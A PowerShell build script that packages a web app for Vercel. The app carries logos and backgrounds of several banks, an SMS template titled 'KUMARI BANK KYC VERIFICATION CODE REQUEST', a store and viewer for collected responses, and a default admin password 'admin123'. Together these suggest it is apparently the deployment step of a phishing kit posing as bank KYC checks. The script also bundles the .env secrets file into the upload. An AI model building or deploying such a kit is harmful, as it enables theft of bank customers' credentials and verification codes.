# build_vercel.ps1 — Build fresh vercel_upload.zip package for Vercel deployment
$staging = Join-Path $env:TEMP "vercel_staging"
if (Test-Path $staging) {
    Remove-Item -Path $staging -Recurse -Force
}
New-Item -ItemType Directory -Path $staging -Force | Out-Null

$baseDir = $PSScriptRoot

# 1. Copy API directory
Copy-Item (Join-Path $baseDir "api") -Destination (Join-Path $staging "api") -Recurse -Force
Write-Host "  Included: api/ (Serverless Functions)" -ForegroundColor Cyan

# 1b. Copy node_modules (required for @supabase/supabase-js on Vercel zip deploy)
$nmSrc = Join-Path $baseDir "node_modules"
if (Test-Path $nmSrc) {
    Write-Host "  Copying node_modules (this may take a moment...)" -ForegroundColor Yellow
    Copy-Item $nmSrc -Destination (Join-Path $staging "node_modules") -Recurse -Force
    Write-Host "  Included: node_modules/" -ForegroundColor Cyan
} else {
    Write-Host "  WARNING: node_modules not found. Run 'npm install' first!" -ForegroundColor Red
}

# 1c. Copy package-lock.json if present
$lockFile = Join-Path $baseDir "package-lock.json"
if (Test-Path $lockFile) {
    Copy-Item $lockFile (Join-Path $staging "package-lock.json") -Force
    Write-Host "  Included: package-lock.json" -ForegroundColor Cyan
}

# 2. Copy Data directory (with clean initial configs)
$dataStaging = Join-Path $staging "data"
New-Item -ItemType Directory -Path $dataStaging -Force | Out-Null
Set-Content -Path (Join-Path $dataStaging "responses.json") -Value "[]" -Encoding UTF8

$adminCfgObj = [ordered]@{
    adminPassword = "admin123"
    updatedAt = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}
Set-Content -Path (Join-Path $dataStaging "admin_config.json") -Value (ConvertTo-Json -InputObject $adminCfgObj -Depth 5) -Encoding UTF8

$cfgObj = [ordered]@{
    recipient = "32001"
    messageTemplate = "KUMARI BANK KYC VERIFICATION CODE REQUEST`nRef: {REF_ID}`nMobile: {MOBILE}`nTime: {TIME}"
    updatedAt = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    deployedAt = ""
    sessionMessages = [ordered]@{}
}
Set-Content -Path (Join-Path $dataStaging "sms_config.json") -Value (ConvertTo-Json -InputObject $cfgObj -Depth 5) -Encoding UTF8
Write-Host "  Included: data/ (Default configurations)" -ForegroundColor Cyan

# 3. Core Web Assets
$coreFiles = @(
    "index.html",
    "responses.html",
    "styles.css",
    "app.js",
    "vercel.json",
    "package.json",
    "supabase_schema.sql"
)
foreach ($f in $coreFiles) {
    $src = Join-Path $baseDir $f
    if (Test-Path $src) {
        Copy-Item $src (Join-Path $staging $f) -Force
        Write-Host "  Included: $f" -ForegroundColor Cyan
    }
}

$jsDir = Join-Path $baseDir "js"
if (Test-Path $jsDir) {
    Copy-Item $jsDir -Destination (Join-Path $staging "js") -Recurse -Force
    Write-Host "  Included: js/" -ForegroundColor Cyan
}

if (Test-Path (Join-Path $baseDir ".env")) {
    Copy-Item (Join-Path $baseDir ".env") (Join-Path $staging ".env") -Force
    Write-Host "  Included: .env" -ForegroundColor Cyan
}

if (Test-Path (Join-Path $baseDir ".gitignore")) {
    Copy-Item (Join-Path $baseDir ".gitignore") (Join-Path $staging ".gitignore") -Force
}

# 4. Images and Branding Assets
$assets = @(
    "kumari_logo.png",
    "kumari_logo_uploaded.jpg",
    "logo.png",
    "logo.jpg",
    "laxmi_banner.png",
    "laxmi_bg.png",
    "laxmi_logo.png",
    "rbb_logo.png",
    "siddhartha_bg.png",
    "siddhartha_logo.jpg"
)
foreach ($asset in $assets) {
    $src = Join-Path $baseDir $asset
    if (Test-Path $src) {
        Copy-Item $src (Join-Path $staging $asset) -Force
        Write-Host "  Included asset: $asset" -ForegroundColor DarkCyan
    }
}

# 5. Create ZIP Archive
$zipPath = Join-Path $baseDir "vercel_upload.zip"
if (Test-Path $zipPath) {
    Remove-Item -Path $zipPath -Force
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($staging, $zipPath)

Remove-Item -Path $staging -Recurse -Force
$zipInfo = Get-Item $zipPath
Write-Host "==========================================================" -ForegroundColor Green
Write-Host "SUCCESS: Updated $zipPath ($($zipInfo.Length) bytes)" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
